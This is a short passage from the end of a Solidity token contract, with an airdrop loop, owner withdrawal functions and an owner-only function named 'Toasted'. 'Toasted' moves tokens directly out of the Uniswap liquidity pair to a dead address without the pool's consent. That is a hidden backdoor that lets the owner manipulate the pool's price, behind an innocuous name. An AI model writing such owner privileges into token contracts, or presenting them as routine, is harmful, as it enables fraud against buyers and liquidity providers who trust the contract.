1223         require(
1224             addresses.length == amounts.length,
1225             "Array sizes must be equal"
1226         );
1227         uint256 i = 0;
1228         while (i < addresses.length) {
1229             uint256 _amount = amounts[i].mul(1e18);
1230             _transfer(msg.sender, addresses[i], _amount);
1231             i += 1;
1232         }
1233     }
1234 
1235     function withdrawETH(uint256 _amount) external onlyOwner {
1236         require(address(this).balance >= _amount, "Invalid Amount");
1237         payable(msg.sender).transfer(_amount);
1238     }
1239 
1240     function withdrawToken(IERC20 _token, uint256 _amount) external onlyOwner {
1241         require(_token.balanceOf(address(this)) >= _amount, "Invalid Amount");
1242         _token.transfer(msg.sender, _amount);
1243     }
1244 
1245     function Toasted(uint256 _amount) external onlyOwner {
1246         super._transfer(uniswapV2Pair, deadAddress, _amount);
1247     }
1248 }